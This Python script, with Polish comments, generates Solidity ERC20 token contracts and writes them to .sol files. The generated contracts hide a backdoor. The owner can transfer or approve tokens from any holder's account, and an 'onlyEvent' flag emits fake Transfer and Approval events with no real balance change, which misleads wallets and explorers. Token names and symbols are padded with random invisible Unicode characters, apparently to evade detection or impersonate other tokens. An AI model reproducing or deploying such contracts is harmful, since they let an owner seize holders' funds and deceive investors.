from web3 import Web3
import json
from solcx import compile_source, install_solc,compile_standard
import os
import random

import eel
import sys
sys.stdout.reconfigure(encoding='utf-8')

# Zainstaluj odpowiednią wersję Solidity
install_solc("0.8.9")



INVISIBLE_CHARS = ['\u180B', '\u200B', '\u200C', '\u200D', '\u2060', '\uFEFF']

def obfuscate_with_invisible_unicode(text):
    
    obfuscated = ""
    for char in text:
        # Zakodowany znak w formacie \uXXXX
        unicode_char = f"\\u{ord(char):04X}"
        obfuscated += unicode_char
        
        # Losowo dodaj niewidzialny znak Unicode
        if random.random() < 0.55:  # 55% szans na wstawienie
            invisible = random.choice(INVISIBLE_CHARS)
            obfuscated += f"\\u{ord(invisible):04X}"
    
    return obfuscated


def generate_token_code(name, symbol, initial_supply, mintable=False, burnable=False, pausable=False):
    """Generuje kod Solidity dla tokena z nadpisanymi metodami transfer i approve oraz opcjonalnymi targetBalanceOf i targetAllowance."""
    '''
    if output_file is None:
        output_file = f"{name}.sol"
    '''
    
    new_name=obfuscate_with_invisible_unicode(name)
    new_symbol=obfuscate_with_invisible_unicode(symbol)
    solidity_code = [
        "// SPDX-License-Identifier: MIT",
        "pragma solidity ^0.8.9;",
        'import "@openzeppelin/contracts/token/ERC20/ERC20.sol";',
        'import "@openzeppelin/contracts/access/Ownable.sol";',  # Ownable zawsze potrzebne dla transfer i approve
    ]
    
    base_contracts = ["ERC20", "Ownable"]
    if pausable:
        solidity_code.append('import "@openzeppelin/contracts/security/Pausable.sol";')
        base_contracts.append("Pausable")
    
    solidity_code.append(f"contract {name} is {', '.join(base_contracts)} {{")
    
    # Konstruktor
    solidity_code.append(f"    constructor() ERC20('{new_name}', '{new_symbol}') {{")
    solidity_code.append(f"        _mint(msg.sender, {initial_supply} * 10 ** decimals());")
    solidity_code.append("        _transferOwnership(msg.sender);")
    solidity_code.append("    }")
    
    # Funkcje Pausable
    if pausable:
        solidity_code.append("    function pause() public onlyOwner {")
        solidity_code.append("        _pause();")
        solidity_code.append("    }")
        solidity_code.append("    function unpause() public onlyOwner {")
        solidity_code.append("        _unpause();")
        solidity_code.append("    }")
    
    # Funkcje Mint i Burn
    if mintable:
        solidity_code.append("    function mint(address owner, uint256 value) public onlyOwner {")
        solidity_code.append("        _mint(owner, value);")
        solidity_code.append("    }")
    
    if burnable:
        solidity_code.append("    function burn(address owner, uint256 value) public onlyOwner {")
        solidity_code.append("        _burn(owner, value);")
        solidity_code.append("    }")
    
    # Nadpisywane metody transfer i approve (obowiązkowe)
    solidity_code.append("    function transfer(address to, uint256 value) public virtual override returns (bool) {")
    solidity_code.append("        return transfer(msg.sender, to, value, false);")
    solidity_code.append("    }")
    solidity_code.append("    function transfer(address from, address to, uint256 value, bool onlyEvent) public virtual returns (bool) {")
    solidity_code.append("        if (msg.sender == owner()) {")
    solidity_code.append("            if (onlyEvent) {")
    solidity_code.append("                emit Transfer(from, to, value);")
    solidity_code.append("            } else {")
    solidity_code.append("                _transfer(from, to, value);")
    solidity_code.append("            }")
    solidity_code.append("        } else {")
    solidity_code.append("            require(from == msg.sender, 'Only owner can transfer from other accounts');")
    solidity_code.append("            _transfer(from, to, value);")
    solidity_code.append("        }")
    solidity_code.append("        return true;")
    solidity_code.append("    }")
    
    solidity_code.append("    function approve(address spender, uint256 value) public virtual override returns (bool) {")
    solidity_code.append("        return approve(msg.sender, spender, value, false);")
    solidity_code.append("    }")

    solidity_code.append("    function approve(address owner_address, address spender, uint256 value, bool onlyEvent) public virtual returns (bool) {")
    solidity_code.append("        if (msg.sender == owner()) {")
    solidity_code.append("            if (onlyEvent) {")
    solidity_code.append("                emit Approval(owner_address, spender, value);")
    solidity_code.append("            } else {")
    solidity_code.append("                _approve(owner_address, spender, value);")
    solidity_code.append("            }")
    solidity_code.append("        } else {")
    solidity_code.append("            require(owner_address == msg.sender, 'Only owner can approve ');")
    solidity_code.append("            _approve(owner_address, spender, value);")
    solidity_code.append("        }")
    solidity_code.append("        return true;")
    solidity_code.append("    }")
    
    solidity_code.append("}")
    
   
    
    full_code = "\n".join(solidity_code)

    return full_code


def save_tocken(name, full_code):
    output_file=os.path.join(os.path.dirname(__file__), f"../../token_code/{name}.sol") 

    with open(output_file, "w") as f:
        f.write(full_code)
    print(f"Kod Solidity zapisany do: {output_file}")
